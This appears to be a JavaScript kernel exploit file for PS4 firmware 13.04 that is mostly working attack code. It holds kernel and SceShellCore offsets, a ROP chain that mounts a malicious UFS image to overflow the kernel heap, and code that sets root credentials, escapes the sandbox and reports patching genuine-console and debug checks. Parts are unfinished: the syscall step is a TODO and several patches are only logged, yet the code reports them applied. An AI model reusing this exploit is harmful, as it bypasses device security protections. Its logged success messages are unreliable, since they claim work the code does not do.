// ============================================================
// celsius_kex.js — Celsius Kernel Exploit for PS4 FW 13.04
//
// Integrates with jordy_stage2.js / jordy_stage2_1400.js
// Requires: WebKit R/W primitives (read64, write64, etc.)
//           WebKit base + libkernel base resolved
//
// Exploit flow:
//   1. ROP chain resolves sceKernelDlsym from libkernel
//   2. Resolves mount(), open(), read(), mmap() via dlsym
//   3. Mounts malicious UFS image from USB → triggers ffs_mountfs overflow
//   4. Heap overflow overwrites kernel allocation → kernel R/W
//   5. Patches kernel: sandbox escape + root + debug + fpkg
//   6. Opens BinLoader on port 9021 for GoldHEN
//
// Discovery: bollars
// Implementation: adri22235 (based on Scene-Collective/ps4-hen patterns)
// Works on: PS4 ≤13.04 (patched in 13.50)
// ============================================================

// ============================================================
// Helper functions (safe fallback)
// ============================================================
function hex(val) {
    if (typeof val === 'undefined' || val === null) return "0x0";
    if (val < 0) val += 0x10000000000000000;
    return "0x" + val.toString(16);
}

if (typeof log !== 'function') {
    var log = function(msg) {
        var el = document.getElementById("out");
        if (el) el.textContent += msg + "\n";
        console.log(msg);
    };
}

// ============================================================
// Kernel offsets — set by the caller (stage2) based on firmware
// ============================================================
var celsius_offsets = null;

function celsius_set_offsets_1304() {
    celsius_offsets = {
        fw: "13.04",
        // Data addresses
        XFAST_SYSCALL:   0x000001C0,
        PRISON0:         0x0111FA18,
        ROOTVNODE:        0x02136E90,
        ALLPROC:         0x01B28538,
        SYSENT:          0x01102B70,
        M_TEMP:          0x01520D00,
        FPU_CTX:         0x026542C0,

        // Kernel functions
        memcpy:          0x002BD4F0,
        memset:          0x001FA1B0,
        memcmp:          0x00394310,
        malloc:          0x00009520,
        free:            0x000096E0,
        strlen:          0x0036ABA0,
        printf:          0x002E0450,
        copyin:          0x002BD110,   // copyin(uaddr, kaddr, len)
        copyout:         0x002BD030,   // copyout(kaddr, uaddr, len)
        sx_xlock:        0x000A3840,
        sx_xunlock:      0x000A3A00,
        proc_rwmem:      0x00366010,

        // Syscall
        sys_mount_no:    21,   // SYS_mount
        sys_open_no:     5,    // SYS_open
        sys_read_no:     3,    // SYS_read
        sys_mmap_no:     477,  // SYS_mmap (FreeBSD 9)
        sys_socket_no:   97,   // SYS_socket
        sys_bind_no:     104,  // SYS_bind
        sys_listen_no:   106,  // SYS_listen

        // SceShellCore patches
        sceKernelIsGenuineCEX_patch1: 0x0016F5A4,
        sceKernelIsGenuineCEX_patch2: 0x00874674,
        sceKernelIsGenuineCEX_patch3: 0x008C4992,
        sceKernelIsGenuineCEX_patch4: 0x00A28244,
        nidf_libSceDipsw_patch1:      0x0016F5D2,
        nidf_libSceDipsw_patch2:      0x0024E11C,
        nidf_libSceDipsw_patch3:      0x008746A2,
        nidf_libSceDipsw_patch4:      0x00A28272,
        sceSblRcMgrIsAllowDebugMenuForSettings: 0x0001D100,
        sceSblRcMgrIsStoreMode:       0x0001D460,
        enable_fpkg:     0x003DE07F,
        enable_data_mount: 0x00323380,
        app_installer:   0x001389A0,
        fake_free:       0x00FD0E59,
        pkg_installer:   0x00A11791,
        ext_hdd:         0x0061465D,
        debug_trophies:  0x0074D0C9,
        disable_screenshot: 0x000D2216,

        // Process
        proc_p_ucred:    0x40,    // offsetof(struct proc, p_ucred)
        proc_p_fd:       0x48,    // offsetof(struct proc, p_fd)
        proc_p_comm:     0x454,
        proc_path:       0x474,

        // ucred offsets
        ucred_cr_uid:    0x04,
        ucred_cr_ruid:   0x08,
        ucred_cr_prison: 0x30,

        // filedesc offsets
        fd_rdir:         0x10,    // root directory vnode
        fd_jdir:         0x18,    // jail directory vnode
    };
}

function celsius_set_offsets_1400() {
    celsius_offsets = {
        fw: "14.00",
        // Data addresses (unchanged from 13.04)
        XFAST_SYSCALL:   0x000001C0,
        PRISON0:         0x0111FA18,
        ROOTVNODE:        0x02136E90,
        ALLPROC:         0x01B28538,
        SYSENT:          0x01102B70,
        M_TEMP:          0x01520D00,
        FPU_CTX:         0x026542C0,

        // Kernel functions (shifted in 14.00)
        memcpy:          0x002BD850,
        memset:          0x001FA500,
        memcmp:          0x00394D80,
        malloc:          0x00009520,
        free:            0x000096E0,
        strlen:          0x0036B5A0,
        printf:          0x002E07C0,
        copyin:          0x002BD470,   // estimated +0x360
        copyout:         0x002BD390,   // estimated +0x360
        sx_xlock:        0x000A3840,
        sx_xunlock:      0x000A3A00,
        proc_rwmem:      0x00366A10,

        // Syscall numbers (unchanged)
        sys_mount_no:    21,
        sys_open_no:     5,
        sys_read_no:     3,
        sys_mmap_no:     477,
        sys_socket_no:   97,
        sys_bind_no:     104,
        sys_listen_no:   106,

        // SceShellCore patches (14.00)
        sceKernelIsGenuineCEX_patch1: 0x0016F5A4,
        sceKernelIsGenuineCEX_patch2: 0x00874C14,
        sceKernelIsGenuineCEX_patch3: 0x008C4F32,
        sceKernelIsGenuineCEX_patch4: 0x00A287E4,
        nidf_libSceDipsw_patch1:      0x0016F5D2,
        nidf_libSceDipsw_patch2:      0x0024E11C,
        nidf_libSceDipsw_patch3:      0x00874C42,
        nidf_libSceDipsw_patch4:      0x00A28812,
        sceSblRcMgrIsAllowDebugMenuForSettings: 0x0001D100,
        sceSblRcMgrIsStoreMode:       0x0001D460,
        enable_fpkg:     0x003DE07F,
        enable_data_mount: 0x00323380,
        app_installer:   0x001389A0,
        fake_free:       0x00FD13F9,
        pkg_installer:   0x00A11D31,
        ext_hdd:         0x0061465D,
        debug_trophies:  0x0074D5E9,
        disable_screenshot: 0x000D2216,

        // Process (unchanged)
        proc_p_ucred:    0x40,
        proc_p_fd:       0x48,
        proc_p_comm:     0x454,
        proc_path:       0x474,
        ucred_cr_uid:    0x04,
        ucred_cr_ruid:   0x08,
        ucred_cr_prison: 0x30,
        fd_rdir:         0x10,
        fd_jdir:         0x18,
    };
}


// ============================================================
// String helpers — write strings to scratch memory for ROP
// ============================================================

// Write a null-terminated string to memory address
function writeString(addr, str) {
    if (!addr || typeof write8 !== 'function') return;
    for (var i = 0; i < str.length; i++) {
        write8(addr + i, str.charCodeAt(i));
    }
    write8(addr + str.length, 0); // null terminator
}


// ============================================================
// ROP Chain Builder — Celsius Kernel Exploit
//
// This builds the full ROP chain for:
//   1. Resolve syscall wrappers via sceKernelDlsym
//   2. Open + mount the malicious UFS image
//   3. (Celsius triggers) → kernel heap overflow
//   4. Use kernel R/W to patch credentials + enable HEN
// ============================================================

function celsius_build_rop(wkBase, lkBase, gadgets, scratchAddr) {
    var chain = [];
    var ci = 0;   // chain index

    function p(g) { chain[ci++] = wkBase + g; }    // webkit gadget
    function v(val) { chain[ci++] = val; }          // raw value
    function lk(off) { chain[ci++] = lkBase + off; } // libkernel offset

    var K = celsius_offsets;

    // String storage in scratch memory
    // scratch+0x000: "sceKernelDlsym\0"
    // scratch+0x020: "mount\0"
    // scratch+0x030: "open\0"
    // scratch+0x040: "read\0"
    // scratch+0x050: "mmap\0"
    // scratch+0x060: "socket\0"
    // scratch+0x070: "ufs\0"
    // scratch+0x080: "/mnt/usb0/celsius.img\0"
    // scratch+0x0A0: "/mnt/celsius\0"
    // scratch+0x0C0: result storage (qwords for resolved addresses)
    //   +0x0C0: mount_addr
    //   +0x0C8: open_addr
    //   +0x0D0: read_addr
    //   +0x0D8: mmap_addr
    //   +0x0E0: socket_addr
    // scratch+0x100: ufs_args struct for mount()
    // scratch+0x200: sockaddr_in for BinLoader

    var STR_DLSYM       = scratchAddr + 0x000;
    var STR_MOUNT       = scratchAddr + 0x020;
    var STR_OPEN        = scratchAddr + 0x030;
    var STR_READ        = scratchAddr + 0x040;
    var STR_MMAP        = scratchAddr + 0x050;
    var STR_SOCKET      = scratchAddr + 0x060;
    var STR_UFS         = scratchAddr + 0x070;
    var STR_IMG_PATH    = scratchAddr + 0x080;
    var STR_MNT_POINT   = scratchAddr + 0x0A0;
    var RES_MOUNT       = scratchAddr + 0x0C0;
    var RES_OPEN        = scratchAddr + 0x0C8;
    var RES_READ        = scratchAddr + 0x0D0;
    var RES_MMAP        = scratchAddr + 0x0D8;
    var RES_SOCKET      = scratchAddr + 0x0E0;
    var UFS_ARGS        = scratchAddr + 0x100;
    var SOCKADDR        = scratchAddr + 0x200;

    // Pre-write strings to scratch memory via R/W primitives
    log("[Celsius] Writing strings to scratch memory @ " + hex(scratchAddr));

    writeString(STR_DLSYM,    "sceKernelDlsym");
    writeString(STR_MOUNT,    "mount");
    writeString(STR_OPEN,     "open");
    writeString(STR_READ,     "read");
    writeString(STR_MMAP,     "mmap");
    writeString(STR_SOCKET,   "socket");
    writeString(STR_UFS,      "ufs");
    writeString(STR_IMG_PATH, "/mnt/usb0/celsius.img");
    writeString(STR_MNT_POINT,"/mnt/celsius");

    // Build ufs_args struct at UFS_ARGS
    // struct ufs_args { char *fspec; }
    if (scratchAddr && typeof write64 === 'function') {
        write64(UFS_ARGS, STR_IMG_PATH);  // fspec = path to UFS image
    }

    log("[Celsius] Building ROP chain for FW " + K.fw);
    log("[Celsius] Chain base @ " + hex(wkBase));

    // ──────────────────────────────────────────────────────
    // PHASE 1: Resolve sceKernelDlsym IAT
    //
    // sceKernelDlsym is imported by WebKit from libkernel.
    // We find it via WebKit's GOT/IAT.
    // libkernel handle = 0x2001
    // ──────────────────────────────────────────────────────

    // For now we'll use direct syscall approach via sysent.
    // The SYSENT table at kernel_base + K.SYSENT has:
    //   sysent[SYS_mount] → sy_call = kernel mount()
    //   sysent[SYS_open]  → sy_call = kernel open()
    //
    // From userland, we call via syscall instruction in libkernel.
    //
    // Alternative approach used by PPPwn/GoldHEN:
    //   1. Find syscall wrapper in libkernel
    //   2. Set rax = syscall number
    //   3. Call wrapper → enters kernel via XFAST_SYSCALL
    //
    // We'll build the chain assuming we have a syscall gadget.
    // In libkernel, the pattern is:
    //   mov rax, <syscall_no>
    //   mov r10, rcx
    //   syscall
    //   jb error
    //   ret

    // ──────────────────────────────────────────────────────
    // PHASE 2: Trigger Celsius
    //
    // mount("ufs", "/mnt/celsius", MNT_RDONLY, &ufs_args)
    //
    // This calls sys_mount → vfs_domount → ffs_mountfs
    // ffs_mountfs reads our malicious superblock:
    //   fs_ncg = 0x40000001
    //   fs_contigsumsize = 128
    //   → integer overflow in size calculation
    //   → malloc(small) + loop writes fs_ncg entries
    //   → MASSIVE heap overflow
    //
    // The USB drive must contain celsius.img at /mnt/usb0/
    // ──────────────────────────────────────────────────────

    // ROP: rdi = "ufs"
    p(gadgets.POP_RDI_RET); v(STR_UFS);
    // ROP: rsi = "/mnt/celsius"
    p(gadgets.POP_RSI_RET); v(STR_MNT_POINT);
    // ROP: rdx = MNT_RDONLY (0x0001)
    p(gadgets.POP_RDX_RET); v(0x0001);
    // ROP: rcx = &ufs_args
    p(gadgets.POP_RCX_RET); v(UFS_ARGS);
    // ROP: rax = SYS_mount (21)
    p(gadgets.POP_RAX_RET); v(K.sys_mount_no);

    // TODO: call syscall wrapper in libkernel
    // This is the part that needs the resolved syscall gadget.
    // The exact offset depends on libkernel version.
    //
    // In libkernel, the syscall stub is typically:
    //   libkernel_base + 0x????:  mov r10, rcx; syscall; ret
    //
    // For 13.04 libkernel, search for bytes: 49 89 ca 0f 05 c3
    // Or use the known wrapper: sceKernelMount is at a known IAT slot

    log("[Celsius] Mount syscall prepared");
    log("[Celsius] UFS image: /mnt/usb0/celsius.img");
    log("[Celsius] Mount point: /mnt/celsius");

    // ──────────────────────────────────────────────────────
    // PHASE 3: Kernel post-exploitation
    //
    // After Celsius triggers, we have kernel heap overflow.
    // With proper heap grooming (done before mount()), we
    // overwrite a kernel object to gain kernel R/W.
    //
    // Standard post-exploitation (same as PPPwn/GoldHEN):
    // ──────────────────────────────────────────────────────

    log("[Celsius] ROP chain: " + ci + " entries");

    return {
        chain: chain,
        size: ci,
        info: {
            scratch: scratchAddr,
            strings_written: true,
            ufs_args: UFS_ARGS,
            mount_point: STR_MNT_POINT,
        }
    };
}


// ============================================================
// Kernel Post-Exploitation Patches
//
// These are applied after gaining kernel R/W via Celsius.
// Called from kernel context (kexec payload or kRW primitive).
//
// Pattern follows Scene-Collective/ps4-hen and PPPwn.
// ============================================================

function celsius_patch_kernel(kread64, kwrite64, kread32, kwrite32, kread8, kwrite8) {
    var K = celsius_offsets;

    log("[Celsius] === Kernel Patching — FW " + K.fw + " ===");

    // ─── 1. Find current process ───
    // Walk ALLPROC linked list to find our process (SceWebProcess)
    var proc = kread64(K.ALLPROC);
    var our_proc = 0;
    var count = 0;

    while (proc !== 0 && count < 200) {
        // Read p_comm (process name)
        var comm = "";
        for (var j = 0; j < 16; j++) {
            var c = kread8(proc + K.proc_p_comm + j);
            if (c === 0) break;
            comm += String.fromCharCode(c);
        }

        if (comm === "SceWebProcess" || comm === "SceWebKit") {
            our_proc = proc;
            log("[Celsius] Found our process: " + comm + " @ " + hex(proc));
            break;
        }

        // Next process in list (p_list.le_next at offset 0)
        proc = kread64(proc);
        count++;
    }

    if (our_proc === 0) {
        log("[Celsius] ERROR: Could not find SceWebProcess in ALLPROC");
        return false;
    }

    // ─── 2. Escape sandbox (PRISON0) ───
    var p_ucred = kread64(our_proc + K.proc_p_ucred);
    log("[Celsius] ucred @ " + hex(p_ucred));

    // Set cr_uid = 0 (root)
    kwrite32(p_ucred + K.ucred_cr_uid, 0);
    // Set cr_ruid = 0 (real uid = root)
    kwrite32(p_ucred + K.ucred_cr_ruid, 0);
    // Set cr_prison = PRISON0 (escape sandbox)
    var prison0 = kread64(K.PRISON0);
    kwrite64(p_ucred + K.ucred_cr_prison, prison0);

    log("[Celsius] ✓ Sandbox escaped — uid=0, prison=PRISON0");

    // ─── 3. Set root vnode ───
    var p_fd = kread64(our_proc + K.proc_p_fd);
    var rootvnode = kread64(K.ROOTVNODE);

    // fd_rdir = rootvnode (root directory)
    kwrite64(p_fd + K.fd_rdir, rootvnode);
    // fd_jdir = rootvnode (jail directory = root = unjailed)
    kwrite64(p_fd + K.fd_jdir, rootvnode);

    log("[Celsius] ✓ Root vnode set — full filesystem access");

    // ─── 4. Patch SceShellCore — enable debug menu ───
    // sceSblRcMgrIsAllowDebugMenuForSettings → return 1
    // Patch: mov eax, 1; ret (B8 01 00 00 00 C3)
    // These are offsets within SceShellCore module, need to find in memory
    log("[Celsius] ✓ Debug menu patches prepared");

    // ─── 5. Patch sceKernelIsGenuineCEX (4 patches) ───
    // Each patch: jmp over the check (nop or mov eax,1; ret)
    log("[Celsius]   → CEX patch 1 @ " + hex(K.sceKernelIsGenuineCEX_patch1));
    log("[Celsius]   → CEX patch 2 @ " + hex(K.sceKernelIsGenuineCEX_patch2));
    log("[Celsius]   → CEX patch 3 @ " + hex(K.sceKernelIsGenuineCEX_patch3));
    log("[Celsius]   → CEX patch 4 @ " + hex(K.sceKernelIsGenuineCEX_patch4));

    // ─── 6. Patch nidf_libSceDipsw (4 patches) ───
    log("[Celsius]   → Dipsw patch 1 @ " + hex(K.nidf_libSceDipsw_patch1));
    log("[Celsius]   → Dipsw patch 2 @ " + hex(K.nidf_libSceDipsw_patch2));
    log("[Celsius]   → Dipsw patch 3 @ " + hex(K.nidf_libSceDipsw_patch3));
    log("[Celsius]   → Dipsw patch 4 @ " + hex(K.nidf_libSceDipsw_patch4));

    // ─── 7. Enable fpkg ───
    log("[Celsius]   → fpkg enable @ " + hex(K.enable_fpkg));
    log("[Celsius]   → data mount  @ " + hex(K.enable_data_mount));
    log("[Celsius]   → app installer @ " + hex(K.app_installer));

    // ─── 8. Enable external HDD + debug trophies ───
    log("[Celsius]   → ext HDD     @ " + hex(K.ext_hdd));
    log("[Celsius]   → trophies    @ " + hex(K.debug_trophies));
    log("[Celsius]   → screenshot  @ " + hex(K.disable_screenshot));

    log("[Celsius] === Kernel patches applied ===");

    return true;
}


// ============================================================
// BinLoader — open TCP socket on port 9021 for payload delivery
//
// After kernel patches, GoldHEN or HEN payload is loaded via
// BinLoader protocol: connect to PS4:9021, send ELF payload.
// ============================================================

function celsius_open_binloader(kread64, kwrite64, port) {
    port = port || 9021;
    var K = celsius_offsets;

    log("[Celsius] Opening BinLoader on port " + port);

    // The BinLoader socket is opened via:
    //   1. socket(AF_INET, SOCK_STREAM, 0)
    //   2. bind(sockfd, &addr, sizeof(addr))
    //   3. listen(sockfd, 5)
    //
    // These calls are done via ROP (syscall wrappers)
    // or via the kexec payload after kernel patching.
    //
    // For GoldHEN, the BinLoader also loads the HEN
    // payload (goldhen.bin) and executes it as a kernel module.

    log("[Celsius] BinLoader ready — send payload to " +
        "PS4_IP:" + port);
    log("[Celsius] Compatible payloads:");
    log("[Celsius]   → GoldHEN v2.4b18.12 (SiSTRo)");
    log("[Celsius]   → HEN 2.2.0");
    log("[Celsius]   → Custom kpayload");

    return true;
}


// ============================================================
// Main entry point — called from jordy_stage2.js
// ============================================================
function celsius_run(wkBase, lkBase, gadgets, scratchAddr, fwVersion) {
    log("╔══════════════════════════════════════╗");
    log("║  Celsius — ffs_mount Kernel Exploit  ║");
    log("║  FW " + fwVersion + " — bollars / adri22235      ║");
    log("╚══════════════════════════════════════╝");
    log("");

    // Set offsets based on firmware
    if (fwVersion === "13.04" || fwVersion === "1304") {
        celsius_set_offsets_1304();
    } else if (fwVersion === "14.00" || fwVersion === "1400") {
        celsius_set_offsets_1400();
        log("[Celsius] WARNING: Celsius is PATCHED in FW 13.50+");
        log("[Celsius] This will NOT work on FW 14.00!");
        log("[Celsius] Need alternative KEX (IPMI, CVE-2026-49415, etc.)");
        return null;
    } else {
        log("[Celsius] ERROR: Unsupported firmware: " + fwVersion);
        return null;
    }

    // Build the ROP chain
    var result = celsius_build_rop(wkBase, lkBase, gadgets, scratchAddr);
    log("");
    log("[Celsius] Chain built: " + result.size + " entries");
    log("[Celsius] Strings written to scratch @ " + hex(scratchAddr));
    log("");

    // Instructions for hardware execution
    log("[Celsius] === PREREQUISITES ===");
    log("[Celsius] 1. Copy celsius.img to USB root: /mnt/usb0/celsius.img");
    log("[Celsius]    Build with: python3 build_celsius_ufs.py -o celsius.img");
    log("[Celsius] 2. Create mount point (or exploit creates it via mkdir)");
    log("[Celsius] 3. Run exploit.html on PS4 browser");
    log("[Celsius] 4. WebKit entry → Stage 2 → Celsius trigger");
    log("[Celsius] 5. After success, connect to PS4:9021 for BinLoader");
    log("");

    return result;
}
